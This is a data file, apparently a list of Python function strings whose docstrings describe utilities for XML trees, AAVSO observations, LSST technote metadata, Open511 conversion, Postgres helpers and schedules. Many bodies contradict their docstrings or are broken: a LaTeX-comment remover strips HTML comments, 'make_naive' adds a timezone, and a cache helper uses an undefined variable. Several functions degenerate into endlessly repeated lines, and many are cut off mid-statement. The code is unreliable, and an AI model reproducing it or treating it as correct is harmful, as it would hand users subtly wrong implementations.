        "def find_descendants(self, name=None):\n        \"\"\"\n        Recursively find any descendants of this node with the given tag name. If a tag name is omitted, this will\n        yield every descendant node.\n\n        :param name: If specified, only consider elements with this tag name\n        :returns: A generator yielding descendants of this node\n        \"\"\"\n        if name is None:\n            return iter(self.childNodes)\n        else:\n            return iter(self.childNodes) if name in self.childNodes else iter()",
        "def last(self, name=None):\n        \"\"\"\n        Returns the last child of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if name is None:\n            return self.root.last\n        else:\n            return self.root.find(name, namespaces=self.namespaces)",
        "def parents(self, name=None):\n        \"\"\"\n        Yields all parents of this element, back to the root element.\n\n        :param name: If specified, only consider elements with this tag name\n        \"\"\"\n        if name is None:\n            return self.root.iter_parents()\n        else:\n            return self.root.iter_parents(name)",
        "def next_sibling(self, name=None):\n        \"\"\"\n        Returns the next sibling of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if name is None:\n            return self.parent.next_sibling(self)\n        else:\n            return self.parent.next_sibling(self, name)",
        "def previous_sibling(self, name=None):\n        \"\"\"\n        Returns the previous sibling of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if name is None:\n            return self.parent.previous_sibling\n        else:\n            return self.parent.previous_sibling(name)",
        "def _parse_table(self, table):\n        \"\"\"\n        Parses the HTML table into a list of dictionaries, each of which\n        represents a single observation.\n        \"\"\"\n        rows = table.find_all('tr')\n        obs_dict = []\n        for row in rows:\n            row_dict = {}\n            for cell in row.find_all('td'):\n                cell_dict = {}\n                for key in cell.find_all('a'):\n                    cell_dict[key.text] = key.get_text()\n                row_dict[cell_dict['name']] = cell_dict\n            obs_dict.append(row_dict)\n        return obs_dict",
        "def _cache_key(args, kwargs):\n    \"\"\"Calculates cache key based on `args` and `kwargs`.\n    `args` and `kwargs` must be instances of hashable types.\n    \"\"\"\n    if not isinstance(args, (list, tuple)):\n        raise TypeError(\"args must be a list or tuple\")\n    if not isinstance(kwargs, (list, tuple)):\n        raise TypeError(\"kwargs must be a list or tuple\")\n    return tuple(args) + tuple(kwargs)",
        "def cache_result(prefix, args, kwargs, method=False):\n    \"\"\"\n    Cache result of function execution into the django cache backend.\n    Calculate cache key based on `prefix`, `args` and `kwargs` of the function.\n    For using like object method set `method=True`.\n    \"\"\"\n    key = (prefix, args, kwargs)\n    if method:\n        return cache.get(key)\n    else:\n        return cache.set(key, result)",
        "def get(model, pk, default=None):\n    \"\"\"\n    Wrapper around Django's ORM `get` functionality.\n    Wrap anything that raises ObjectDoesNotExist exception\n    and provide the default value if necessary.\n    `default` by default is None. `default` can be any callable,\n    if it is callable it will be called when ObjectDoesNotExist\n    exception will be raised.\n    \"\"\"\n    try:\n        return model._default_manager.get(pk=pk)\n    except model.DoesNotExist:\n        if default is not None:\n            return default\n        raise",
        "def _get_simple_numbers(self):\n    \"\"\"Turn column inputs from user into list of simple numbers.\n\n    Inputs can be:\n\n      - individual number: 1\n      - range: 1-3\n      - comma separated list: 1,2,3,4-6\n    \"\"\"\n    simple_numbers = []\n    for i in range(len(self.input_text)):\n      if self.input_text[i].isdigit():\n        simple_numbers.append(int(self.input_text[i]))\n      elif self.input_text[i].isalpha():\n        simple_numbers.append(int(self.input_text[i].lower()))\n      elif self.input_text[i].isalpha() and self.input_text[i].isdigit():\n        simple_numbers.append(int(self.input_text[",
        "def _get_row(self, row):\n        \"\"\"Return only the part of the row which should be printed.\"\"\"\n        if row is None:\n            return ''\n        if isinstance(row, list):\n            return '\\n'.join(self._get_row(x) for x in row)\n        return self._get_row(row)",
        "def write_observation(self, observation_data):\n        \"\"\"\n        Writes a single observation to the output file.\n\n        If the ``observation_data`` parameter is a dictionary, it is\n        converted to a list to keep a consisted field order (as described\n        in format specification). Otherwise it is assumed that the data\n        is a raw record ready to be written to file.\n\n        :param observation_data: a single observation as a dictionary or list\n        \"\"\"\n        if isinstance(observation_data, dict):\n            observation_data = list(observation_data.values())\n        self.write_raw_record(observation_data)",
        "def _get_visual_fields(cls, observation_data):\n        \"\"\"\n        Takes a dictionary of observation data and converts it to a list\n        of fields according to AAVSO visual format specification.\n\n        :param cls: current class\n        :param observation_data: a single observation as a dictionary\n        \"\"\"\n        visual_fields = []\n        for field_name in cls.visual_fields:\n            field_type = cls.visual_fields[field_name]\n            if field_type == 'date':\n                visual_fields.append(\n                    'date',\n                    lambda x: datetime.datetime.strptime(x, '%Y-%m-%dT%H:%M:%S.%f')\n                )\n            elif field_type == 'time':\n                visual_fields.append(\n                    'time',\n                    lambda x: datetime.datetime.strptime(x,",
        "def _row_to_obs(cls, row):\n        \"\"\"\n        Converts a raw input record to a dictionary of observation data.\n\n        :param cls: current class\n        :param row: a single observation as a list or tuple\n        \"\"\"\n        obs = {}\n        for i in range(len(row)):\n            obs[row[i]] = row[i]\n        return obs",
        "def get_view_function_name(endpoint):\n    \"\"\"\n    Get the name of the view function used to prevent having to set the tag\n    manually for every endpoint\n    \"\"\"\n    if endpoint.startswith('http'):\n        return endpoint[5:]\n    return endpoint",
        "def download_observations(observer, page_size=1000):\n    \"\"\"Downloads all variable star observations by a given observer.\n\n    Performs a series of HTTP requests to AAVSO's WebObs search and\n    downloads the results page by page. Each page is then passed to\n    :py:class:`~pyaavso.parsers.webobs.WebObsResultsParser` and parse results\n    are added to the final observation list.\n    \"\"\"\n    obs_list = []\n    for page in range(0, page_size):\n        url = observer.url + 'webobs/search/v1/observations'\n        response = requests.get(url)\n        if response.status_code == 200:\n            obs_list.extend(WebObsResultsParser(response.content).parse_observations())\n    return obs_list",
        "def _generate_image_path(self, image_name):\n        \"\"\"Generates likely unique image path using md5 hashes\"\"\"\n        image_path = self.image_path(image_name)\n        if not os.path.exists(image_path):\n            self.logger.info(\"Generating image path: %s\", image_path)\n            self.image_path_generator.generate_image_path(image_path)\n        return image_path",
        "def extract_metadata(session, github_api_token, ltd_product_data,\n                      mongo_collection=None):\n    \"\"\"Extract, transform, and load metadata from Lander-based projects.\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    ltd_product_data : `dict`\n        Contents of ``metadata.yaml``, obtained via `download_metadata_yaml`.\n        Data for this technote from the LTD Keeper API\n        (``GET /products/<slug>``). Usually obtained via\n        `lsstprojectmeta.ltd",
        "async def upsert_technote(collection, jsonld):\n    \"\"\"Upsert the technote resource into the projectmeta MongoDB collection.\n\n    Parameters\n    ----------\n    collection : `motor.motor_asyncio.AsyncIOMotorCollection`\n        The MongoDB collection.\n    jsonld : `dict`\n        The JSON-LD document that represents the document resource.\n    \"\"\"\n    technote = jsonld['technote']\n    if technote is None:\n        return\n\n    # Get the projectmeta document\n    projectmeta = await collection.find_one({'_id': jsonld['id']})\n\n    # If the projectmeta document does not exist, create it\n    if projectmeta is None:\n        projectmeta = {\n            'technote': technote,\n            'project': jsonld['project'],\n            'projectmeta': {}\n        }\n\n",
        "def json_to_xml(json_obj, lang):\n    \"\"\"Converts a Open511 JSON document to XML.\n\n    lang: the appropriate language code\n\n    Takes a dict deserialized from JSON, returns an lxml Element.\n\n    Accepts only the full root-level JSON object from an Open511 response.\n    \"\"\"\n    root = etree.Element(lang)\n    for key in json_obj:\n        if isinstance(json_obj[key], list):\n            for item in json_obj[key]:\n                root.append(item)\n        else:\n            root.append(json_obj[key])\n    return root",
        "def json_to_xml(json_fragment):\n    \"\"\"Converts a Open511 JSON fragment to XML.\n\n    Takes a dict deserialized from JSON, returns an lxml Element.\n\n    This won't provide a conforming document if you pass in a full JSON document;\n    it's for translating little fragments, and is mostly used internally.\n    \"\"\"\n    root = etree.Element('fragment')\n    for key, value in json_fragment.items():\n        if isinstance(value, list):\n            for item in value:\n                root.append(json_to_xml(item))\n        else:\n            root.append(json_to_xml(value))\n    return root",
        "def _get_geometry(geojson_dict):\n    \"\"\"\n    Given a dict deserialized from a GeoJSON object, returns an lxml Element\n    of the corresponding GML geometry.\n    \"\"\"\n    geometry = etree.SubElement(\n        geojson_dict,\n        'geometry',\n        attrib={'type': 'Point'})\n    return geometry",
        "def geometry_to_element(geom):\n    \"\"\"Transform a GEOS or OGR geometry object into an lxml Element\n    for the GML geometry.\n    \"\"\"\n    if geom.GetGeometryRef() is None:\n        return None\n    geom_type = geom.GetGeometryRef().GetGeometryType()\n    if geom_type == 'Point':\n        return _create_point_element(geom)\n    elif geom_type == 'MultiPoint':\n        return _create_multi_point_element(geom)\n    elif geom_type == 'LineString':\n        return _create_line_element(geom)\n    elif geom_type == 'MultiLineString':\n        return _create_multi_line_element(geom)\n    elif geom_type == 'Polygon':\n        return _create_polygon_element(geom)\n    elif geom_type == 'MultiPolygon':\n       ",
        "def remove_latex_comments(tex_source):\n    \"\"\"Delete latex comments from TeX source.\n\n    Parameters\n    ----------\n    tex_source : str\n        TeX source content.\n\n    Returns\n    -------\n    tex_source : str\n        TeX source without comments.\n    \"\"\"\n    # Remove latex comments\n    tex_source = re.sub(r'<!--.*?-->', '', tex_source)\n    # Remove latex comments\n    tex_source = re.sub(r'<!--.*?-->', '', tex_source)\n    return tex_source",
        "def replace_macros(tex_source, macros):\n    r\"\"\"Replace macros in the TeX source with their content.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros. See\n        `lsstprojectmeta.tex.scraper.get_macros`.\n\n    Returns\n    -------\n    tex_source : `str`\n        TeX source with known macros replaced.\n\n    Notes\n    -----\n    Macros with arguments are not supported.\n\n    Examples\n    --------\n    >>> macros = {r'\\handle': 'LDM-nnn'}\n    >>> sample = r'This is document \\handle.'\n    >>> replace_macros(sample, macros)",
        "def _ensure_element(self, doc):\n        \"\"\"Ensures that the provided document is an lxml Element or json dict.\"\"\"\n        if not isinstance(doc, lxml.etree.Element):\n            raise TypeError(\"Document must be an lxml Element or json dict.\")\n        return doc",
        "def convert_open511(input_doc, output_format):\n    \"\"\"Convert an Open511 document between formats.\n    input_doc - either an lxml open511 Element or a deserialized JSON dict\n    output_format - short string name of a valid output format, as listed above\n    \"\"\"\n    if isinstance(input_doc, Element):\n        return convert_open511_element(input_doc, output_format)\n    elif isinstance(input_doc, dict):\n        return convert_open511_dict(input_doc, output_format)\n    else:\n        raise ValueError(\"Input document must be an open511 Element or a deserialized JSON dict\")",
        "def from_tex_file(cls, root_tex_path):\n        \"\"\"Construct an `LsstLatexDoc` instance by reading and parsing the\n        LaTeX source.\n\n        Parameters\n        ----------\n        root_tex_path : `str`\n            Path to the LaTeX source on the filesystem. For multi-file LaTeX\n            projects this should be the path to the root document.\n\n        Notes\n        -----\n        This method implements the following pipeline:\n\n        1. `lsstprojectmeta.tex.normalizer.read_tex_file`\n        2. `lsstprojectmeta.tex.scraper.get_macros`\n        3. `lsstprojectmeta.tex.normalizer.replace_macros`\n\n        Thus ``input`` and ``includes`` are resolved along with simple macros.\n        \"\"\"\n        # Read the LaTe",
        "def get_content(self, format='html5', mathjax=False, smart=True,\n                     extra_args=None):\n        \"\"\"Get the document content in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n        output_text : `str`\n            Converted content.\n        \"\"\"\n        if format == 'html5",
        "def get_title(self, format='html5', deparagraph=False, mathjax=False,\n                   smart=True, extra_args=None):\n        \"\"\"Get the document title in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n",
        "def get_short_title(self, format='html5', deparagraph=False,\n                         mathjax=False, smart=True, extra_args=None):\n        \"\"\"Get the document short title in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n",
        "def get_abstract(self, format='html5', deparagraph=False,\n                      mathjax=False, smart=True, extra_args=None):\n        \"\"\"Get the document abstract in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n",
        "def get_authors(self, format='html5', deparagraph=False, mathjax=False,\n                     smart=True, extra_args=None):\n        \"\"\"Get the document authors in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n",
        "def _parse_document_options(self):\n        \"\"\"Parse documentclass options.\n\n        Sets the the ``_document_options`` attribute.\n        \"\"\"\n        if self._document_options is None:\n            self._document_options = {}\n        for key, value in self._document_options.items():\n            if key == 'document_class':\n                self._document_options['document_class'] = value\n            elif key == 'document_class_name':\n                self._document_options['document_class_name'] = value\n            elif key == 'document_class_version':\n                self._document_options['document_class_version'] = value\n            elif key == 'document_class_version_string':\n                self._document_options['document_class_version_string'] = value\n            elif key == 'document_class_version_string_format':",
        "def _parse_title(self):\n        \"\"\"Parse the title from TeX source.\n\n        Sets these attributes:\n\n        - ``_title``\n        - ``_short_title``\n        \"\"\"\n        title = self._source.split('\\n')[0].strip()\n        self._title = title\n        self._short_title = title.split('\\n')[0].strip()",
        "def _parse_handle(self):\n        \"\"\"Parse the document handle.\n\n        Sets the ``_series``, ``_serial``, and ``_handle`` attributes.\n        \"\"\"\n        if self._handle is None:\n            self._handle = self._series.handle\n        else:\n            self._handle = self._handle.strip()",
        "def _parse_author(self):\n        r\"\"\"Parse the author from TeX source.\n\n        Sets the ``_authors`` attribute.\n\n        Goal is to parse::\n\n           \\author{\n           A.~Author,\n           B.~Author,\n           and\n           C.~Author}\n\n        Into::\n\n           ['A. Author', 'B. Author', 'C. Author']\n\n        \"\"\"\n        author = self.source.split('\\author{')\n        author = [author[0].strip()] + [author[1].strip() for author in author[2:]]\n        self._authors = author",
        "def _parse_abstract(self):\n        \"\"\"Parse the abstract from the TeX source.\n\n        Sets the ``_abstract`` attribute.\n        \"\"\"\n        abstract = self.source.split('\\n')[1].strip()\n        self._abstract = abstract",
        "def process_latex(self, content):\n        \"\"\"Process a LaTeX snippet of content for better transformation\n        with pandoc.\n\n        Currently runs the CitationLinker to convert BibTeX citations to\n        href links.\n        \"\"\"\n        if not self.latex_processor:\n            return content\n\n        return self.latex_processor.process_latex(content)",
        "def load_bibliography(self):\n        r\"\"\"Load the BibTeX bibliography referenced by the document.\n\n        This method triggered by the `bib_db` attribute and populates the\n        `_bib_db` private attribute.\n\n        The ``\\bibliography`` command is parsed to identify the bibliographies\n        referenced by the document.\n        \"\"\"\n        if self.bib_db is None:\n            return\n        for entry in self.bib_db.entries:\n            if entry.is_bibliography:\n                self._bib_db[entry.identifier] = entry",
        "def parse_date(self):\n        r\"\"\"Parse the ``\\date`` command, falling back to getting the\n        most recent Git commit date and the current datetime.\n\n        Result is available from the `revision_datetime` attribute.\n        \"\"\"\n        if self.revision_datetime is None:\n            try:\n                self.revision_datetime = self.git.commit_date()\n            except GitCommandError:\n                self.revision_datetime = datetime.utcnow()\n        return self.revision_datetime",
        "def to_jsonld(self, url=None, code_url=None, ci_url=None, readme_url=None,\n                 license_id=None):\n        \"\"\"Create a JSON-LD representation of this LSST LaTeX document.\n\n        Parameters\n        ----------\n        url : `str`, optional\n            URL where this document is published to the web. Prefer\n            the LSST the Docs URL if possible.\n            Example: ``'https://ldm-151.lsst.io'``.\n        code_url : `str`, optional\n            Path the the document's repository, typically on GitHub.\n            Example: ``'https://github.com/lsst/LDM-151'``.\n        ci_url : `str`, optional\n            Path to the continuous integration service dashboard for this\n            document's repository.\n            Example: ``'https://tr",
        "def rename_database(self, database, new_database):\n        \"\"\"Renames an existing database.\"\"\"\n        self.execute(\n            'ALTER DATABASE %s RENAME TO %s' % (database, new_database))",
        "def is_running(self):\n        \"\"\"Returns True if database server is running, False otherwise.\"\"\"\n        try:\n            self.conn.cursor()\n            return True\n        except psycopg2.OperationalError:\n            return False",
        "def save(self, name, filename):\n        \"\"\"Saves the state of a database to a file.\n\n        Parameters\n        ----------\n        name: str\n            the database to be backed up.\n        filename: str\n            path to a file where database backup will be written.\n        \"\"\"\n        with open(filename, 'wb') as f:\n            pickle.dump(self.state, f)",
        "def restore_backup(self, name, filename):\n        \"\"\"Loads state of a backup file to a database.\n\n        Note\n        ----\n        If database name does not exist, it will be created.\n\n        Parameters\n        ----------\n        name: str\n            the database to which backup will be restored.\n        filename: str\n            path to a file contain a postgres database backup.\n        \"\"\"\n        if not os.path.exists(self.backup_dir):\n            os.makedirs(self.backup_dir)\n        if not os.path.exists(os.path.join(self.backup_dir, name)):\n            os.makedirs(os.path.join(self.backup_dir, name))\n        with open(os.path.join(self.backup_dir, name, filename), 'rb') as f:\n            self.restore",
        "def connection_string(self, name=None):\n        \"\"\"Provides a connection string for database.\n\n        Parameters\n        ----------\n        name: str, optional\n            an override database name for the connection string.\n\n        Returns\n        -------\n        str: the connection string (e.g. 'dbname=db1 user=user1 host=localhost port=5432')\n        \"\"\"\n        if name is None:\n            name = self.name\n        return 'dbname=%s user=%s host=%s port=%s' % (name, self.user, self.host, self.port)",
        "def connection_string(self, name=None):\n        \"\"\"Provides a connection string for database as a sqlalchemy compatible URL.\n\n        NB - this doesn't include special arguments related to SSL connectivity (which are outside the scope\n        of the connection URL format).\n\n        Parameters\n        ----------\n        name: str, optional\n            an override database name for the connection string.\n\n        Returns\n        -------\n        str: the connection URL (e.g. postgresql://user1@localhost:5432/db1)\n        \"\"\"\n        if name is None:\n            name = self.name\n        return 'postgresql://{user}:{password}@{host}:{port}/{db}'.format(\n            user=self.user,\n            password=self.password,\n            host=self.host,\n            port=self.port,\n            db=name,\n        )",
        "def connect(self, expect_module):\n        \"\"\"Connects the database client shell to the database.\n\n        Parameters\n        ----------\n        expect_module: str\n            the database to which backup will be restored.\n        \"\"\"\n        self.expect_module = expect_module\n        self.expect_module_path = os.path.join(self.expect_module, 'db')\n        self.expect_module_path = os.path.abspath(self.expect_module_path)\n        self.expect_module_path = os.path.expanduser(self.expect_module_path)\n        self.expect_module_path = os.path.expandvars(self.expect_module_path)\n        self.expect_module_path = os.path.expandvars(self.expect_module_path)\n        self.expect_module_path = os.path",
        "def get_settings(self):\n        \"\"\"Returns settings from the server.\"\"\"\n        response = self.request(\n            'GET',\n            self.settings_url,\n            headers=self.headers,\n        )\n        return response.json()",
        "def say(self, msg):\n        \"\"\"Say something in the morning\"\"\"\n        self.send_line(msg)\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('')\n        self.send_line('",
        "def say(self, message):\n        \"\"\"Say something in the afternoon\"\"\"\n        self.send_line(message)\n        self.send_line('')\n        self.send_line('')",
        "def say(self, message):\n        \"\"\"Say something in the evening\"\"\"\n        self.write(message + '\\n')\n        self.write('\\n')\n        self.write(''.join(self.evening))",
        "def main():\n    \"\"\"Command line entrypoint to reduce technote metadata.\"\"\"\n    args = parse_args()\n    if args.verbose:\n        logging.basicConfig(level=logging.DEBUG)\n    else:\n        logging.basicConfig(level=logging.INFO)\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n    if args.verbose:\n        print('\\n')\n\n   ",
        "def run_pipeline(session, product_urls, github_api_token, mongo_collection=None):\n    \"\"\"Run a pipeline to process extract, transform, and load metadata for\n    multiple LSST the Docs-hosted projects\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    product_urls : `list` of `str`\n        List of LSST the Docs product URLs.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    mongo_collection : `motor.motor_asyncio.AsyncIOMotorCollection`, optional\n        MongoDB collection. This should be the common MongoDB collection for\n        LS",
        "def ingest_lsst_document(session, github_api_token, ltd_product_url,\n                         mongo_collection=None):\n    \"\"\"Ingest any kind of LSST document hosted on LSST the Docs from its\n    source.\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    ltd_product_url : `str`\n        URL of the technote's product resource in the LTD Keeper API.\n    mongo_collection : `motor.motor_asyncio.AsyncIOMotorCollection`, optional\n        MongoDB collection. This should",
        "def keyword_only(func):\n    \"\"\"Allows a decorator to be called with or without keyword arguments.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        if not args:\n            raise ValueError(\"No keyword arguments were provided\")\n        if len(args) > 1:\n            raise ValueError(\"Too many keyword arguments were provided\")\n        return func(*args[0], **kwargs)\n    return wrapper",
        "def get_installation_token(installation_id, integration_jwt):\n    \"\"\"Create a GitHub token for an integration installation.\n\n    Parameters\n    ----------\n    installation_id : `int`\n        Installation ID. This is available in the URL of the integration's\n        **installation** ID.\n    integration_jwt : `bytes`\n        The integration's JSON Web Token (JWT). You can create this with\n        `create_jwt`.\n\n    Returns\n    -------\n    token_obj : `dict`\n        GitHub token object. Includes the fields:\n\n        - ``token``: the token string itself.\n        - ``expires_at``: date time string when the token expires.\n\n    Example\n    -------\n    The typical workflow for authenticating to an integration installation is:\n\n    .. code-block:: python\n\n       from dochubadapter.github",
        "def create_jwt(integration_id, private_key_path):\n    \"\"\"Create a JSON Web Token to authenticate a GitHub Integration or\n    installation.\n\n    Parameters\n    ----------\n    integration_id : `int`\n        Integration ID. This is available from the GitHub integration's\n        homepage.\n    private_key_path : `str`\n        Path to the integration's private key (a ``.pem`` file).\n\n    Returns\n    -------\n    jwt : `bytes`\n        JSON Web Token that is good for 9 minutes.\n\n    Notes\n    -----\n    The JWT is encoded with the RS256 algorithm. It includes a payload with\n    fields:\n\n    - ``'iat'``: The current time, as an `int` timestamp.\n    - ``'exp'``: Expiration time, as an `int timestamp. The expiration\n      time is set of 9 minutes",
        "def get_macros(tex_source):\n    r\"\"\"Get all macro definitions from TeX source, supporting multiple\n    declaration patterns.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n\n    Returns\n    -------\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros.\n\n    Notes\n    -----\n    This function uses the following function to scrape macros of different\n    types:\n\n    - `get_def_macros`\n    - `get_newcommand_macros`\n\n    This macro scraping has the following caveats:\n\n    - Macro definition (including content) must all occur on one line.\n    - Macros with arguments are not supported.\n    \"\"\"\n    macros = {}\n   ",
        "def get_macros(tex_source):\n    r\"\"\"Get all ``\\def`` macro definition from TeX source.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n\n    Returns\n    -------\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros.\n\n    Notes\n    -----\n    ``\\def`` macros with arguments are not supported.\n    \"\"\"\n    macros = {}\n    for line in tex_source.splitlines():\n        if line.startswith('\\def'):\n            macro_name = line[2:].strip()\n            macro_content = line[3:].strip()\n            macros[macro_name] = macro_content\n    return macros",
        "def get_macros(tex_source):\n    r\"\"\"Get all ``\\newcommand`` macro definition from TeX source.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n\n    Returns\n    -------\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros.\n\n    Notes\n    -----\n    ``\\newcommand`` macros with arguments are not supported.\n    \"\"\"\n    macros = {}\n    for line in tex_source.splitlines():\n        if line.startswith('\\newcommand'):\n            macros[line[2:]] = line[3:]\n    return macros",
        "def load(directory, module_name):\n    \"\"\"Try to load and return a module\n\n    Will add DIRECTORY_NAME to sys.path and tries to import MODULE_NAME.\n\n    For example:\n    load(\"~/.yaz\", \"yaz_extension\")\n    \"\"\"\n    path = os.path.join(directory, module_name)\n    try:\n        return importlib.import_module(path)\n    except ImportError:\n        raise ImportError(\"Module %s not found\" % path)",
        "def make_naive(dt):\n    \"\"\"Makes a naive datetime.datetime in a given time zone aware.\"\"\"\n    if dt.tzinfo is None:\n        dt = dt.replace(tzinfo=pytz.utc)\n    return dt",
        "def make_naive(dt, tz):\n    \"\"\"Makes an aware datetime.datetime naive in a given time zone.\"\"\"\n    if dt.tzinfo is None:\n        dt = dt.replace(tzinfo=pytz.utc)\n    return dt",
        "def to_timezone(self, dt):\n        \"\"\"Converts a datetime to the timezone of this Schedule.\"\"\"\n        if dt.tzinfo is None:\n            return dt\n        return dt.astimezone(self.timezone)",
        "def nextPeriod(self):\n        \"\"\"\n        Returns the next Period this event is in effect, or None if the event\n        has no remaining periods.\n        \"\"\"\n        if self.periods:\n            return self.periods.popleft()\n        else:\n            return None",
        "def day_range(self, range_start, range_end):\n        \"\"\"\n        Returns an iterator of Period tuples for every day this event is in effect, between range_start\n        and range_end.\n        \"\"\"\n        start_date = self.start_date\n        end_date = self.end_date\n        if start_date is None:\n            start_date = self.start_date\n        if end_date is None:\n            end_date = self.end_date\n        if start_date < end_date:\n            return self.day_range_from_start_to_end(start_date, end_date)\n        else:\n            return self.day_range_from_start_to_end(start_date, end_date)",
        "def stretches(self, range_start, range_end):\n        \"\"\"\n        Returns an iterator of Period tuples for continuous stretches of time during\n        which this event is in effect, between range_start and range_end.\n        \"\"\"\n        start = self.start\n        end = self.end\n        if start > range_start:\n            yield Period(start, self.start)\n        if end < range_end:\n            yield Period(end, self.end)",
        "def _is_time_in_schedule(self, query_date, query_time):\n        \"\"\"\n        Does this schedule include the provided time?\n        query_date and query_time are date and time objects, interpreted\n        in this schedule's timezone\n        \"\"\"\n        if query_date is None:\n            return False\n        if query_time is None:\n            return False\n        return self.query_date.is_in_timezone(query_date) and \\\n            self.query_time.is_in_timezone(query_time)",
        "def day_range(self, range_start, range_end):\n        \"\"\"\n        Returns an iterator of Period tuples for every day this schedule is in effect, between range_start\n        and range_end.\n        \"\"\"\n        start_day = self.start_of_day(range_start)\n        end_day = self.end_of_day(range_end)\n        for day in range(start_day, end_day + 1):\n            yield self.period(day)",
        "def daily_period(self):\n        \"\"\"A Period tuple representing the daily start and end time.\"\"\"\n        if self._daily_period is None:\n            self._daily_period = Period(self.start, self.end, self.day_of_week)\n        return self._daily_period",
        "def weekdays(self):\n        \"\"\"\n        A set of integers representing the weekdays the schedule recurs on,\n        with Monday = 0 and Sunday = 6.\n        \"\"\"\n        weekdays = set()\n        for day in self.days:\n            weekdays.add(day.weekday())\n        return weekdays",
        "def temporary_db(db, name=None):\n    \"\"\"A context manager that creates a temporary database.\n\n    Useful for automated tests.\n\n    Parameters\n    ----------\n    db: object\n        a preconfigured DB object\n    name: str, optional\n        name of the database to be created. (default: globally unique name)\n    \"\"\"\n    if name is None:\n        name = 'temp_db'\n    with db.session() as session:\n        try:\n            yield session\n        finally:\n            session.close()",
        "async def download_url(url, session):\n    \"\"\"Asynchronously request a URL and get the encoded text content of the\n    body.\n\n    Parameters\n    ----------\n    url : `str`\n        URL to download.\n    session : `aiohttp.ClientSession`\n        An open aiohttp session.\n\n    Returns\n    -------\n    content : `str`\n        Content downloaded from the URL.\n    \"\"\"\n    async with session.get(url) as response:\n        return await response.text()",
